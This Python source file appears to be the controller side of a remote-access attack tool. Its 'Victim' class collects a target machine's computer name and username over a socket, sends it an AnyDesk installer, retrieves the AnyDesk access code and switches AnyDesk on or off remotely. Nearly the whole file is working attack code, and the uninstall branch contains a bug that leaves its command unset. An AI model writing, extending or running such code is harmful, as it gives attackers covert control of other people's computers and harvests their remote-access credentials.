import os
from re import I
from constants import *


class ThereIsAlreadyOneRunningCommand(Exception):
    pass


class Victim:

    code = None
    IS_PROCESSING = False

    def __init__(self, socket, code=None):
        """
        param 1: the socket of the victim
        param 2: the anydesk code of the victim

        param 1 type: socket.socket
        param 2 type: str
        """

        self.socket = socket
        self.code = code

        # Gets the computer name
        self.computerName = self.socket.recv(16).rstrip(b'\x00').decode()
        # Gets the logged username
        self.loggedUserName = self.socket.recv(
            257).rstrip(b'\xfe').rstrip(b'\x00').decode()
        # Gets if the wanted anydesk file is already installed on this victim's pc
        self.isAnyDeskInstalled = int.from_bytes(
            self.socket.recv(4), "big") == 1

        print(f"Vicitm({self.socket.getsockname()}) details:\nComputer Name: {self.computerName}\nLogged Username: {self.loggedUserName}\nIs anydesk already installed? : {self.isAnyDeskInstalled}")

    def _lockCommands(self):
        self.IS_PROCESSING = True

    def _unlockCommands(self):
        self.IS_PROCESSING = False

    def getAddr(self):
        """
        Returns the socket address (IP, PORT) of the victim

        return type: tuple
        """

        return self.socket.getsockname()

    def initialize(self):
        """
        Initalizes the victim:
        Install anydesk and get the code
        """

        if self.IS_PROCESSING:
            print("Can't perform another command while anothe one is running!")
            raise ThereIsAlreadyOneRunningCommand()
        self._lockCommands()

        self._unlockCommands()
        self._installAnydesk()
        self._lockCommands()

        print(
            f"{self.getAddr()}: Waiting for the victim to install anydesk and send us the code!")
        print(f"{self.getAddr()}: Trying get the code...")

        code = self.socket.recv(9).decode()
        print(f"{self.getAddr()}: The code of the victim is {code}")
        self.code = code

        self._unlockCommands()
        return code

    def _installAnydesk(self):
        """
        Installs anydesk on the victim pc
        """

        if self.IS_PROCESSING:
            print("Can't perform another command while anothe one is running!")
            raise ThereIsAlreadyOneRunningCommand()
        self._lockCommands()

        self._sendCommand(INSTALL_ANYDESK_COMMAND)

        print(
            f"{self.getAddr()}: Sending the anydesk file to the victim...")

        # Sends the anydesk file
        fileSize = os.path.getsize(ANYDESK_FILE_PATH)
        self.socket.send(fileSize.to_bytes(4, "big"))

        with open(ANYDESK_FILE_PATH, 'rb') as anydeskFile:
            totalRead = 0
            read = 0

            while totalRead < fileSize:
                read = anydeskFile.read(1024)
                self.socket.send(read)
                totalRead += len(read)

        print(
            f"{self.getAddr()}: The anydesk file has been sent to the victim !")

        self._unlockCommands()

    def getCode(self):
        """
        Returns the anydesk code of the victim

        return type: str
        """

        if self.IS_PROCESSING:
            print("Can't perform another command while anothe one is running!")
            raise ThereIsAlreadyOneRunningCommand()
        self._lockCommands()

        print(f"{self.getAddr()}: Getting the code from the victim...")
        self._sendCommand(GET_CODE_COMMAND)

        code = self.socket.recv(9).decode()

        print(f"{self.getAddr()}: The code of the victim is {code}")

        self._unlockCommands()
        return code

    def powerOnAnydesk(self):
        """
        Powers on anydesk on the victim's pc
        """
        if self.IS_PROCESSING:
            print("Can't perform another command while anothe one is running!")
            raise ThereIsAlreadyOneRunningCommand()
        self._lockCommands()

        print(f"{self.getAddr()}: Powering on anydesk on the victim's pc")
        self._sendCommand(POWER_ON_ANYDESK_COMMAND)
        print(
            f"{self.getAddr()}: Anydesk will be powered on Immediately on the victim's pc")

        self._unlockCommands()

    def powerOffAnydesk(self):
        """
        Powers off (kill) anydesk on the victim's pc
        """

        if self.IS_PROCESSING:
            print("Can't perform another command while anothe one is running!")
            raise ThereIsAlreadyOneRunningCommand()
        self._lockCommands()

        print(f"{self.getAddr()}: Powering off anydesk on the victim's pc")
        self._sendCommand(POWER_OFF_ANYDESK_COMMAND)
        print(
            f"{self.getAddr()}: Anydesk will be powered off Immediately on the victim's pc")

        self._unlockCommands()

    def _sendCommand(self, command):
        """
        Sends the command to the victim

        param 1: the command to executes
        param 1 type: str
        """

        code = None

        if command == INSTALL_ANYDESK_COMMAND:
            code = INSTALL_ANYDESK_CODE

        elif command == GET_CODE_COMMAND:
            code = GET_CODE_COMMAND_CODE

        elif command == POWER_ON_ANYDESK_COMMAND:
            code = POWER_ON_ANYDESK_CODE

        elif command == POWER_OFF_ANYDESK_COMMAND:
            code = POWER_OFF_ANYDESK_CODE

        elif command == UNINSTALL_PROGRAM_COMMAND:
            code == UNINSTALL_PROGRAM_CODE

        else:
            raise ValueError("Invalid command!")

        print(
            f"{self.getAddr()} Sending command to the victim - ({command}) ...")
        self.socket.send(code.to_bytes(4, "big"))
        print(
            f"{self.getAddr()} The Command has been sent to the victim - ({command}) !")
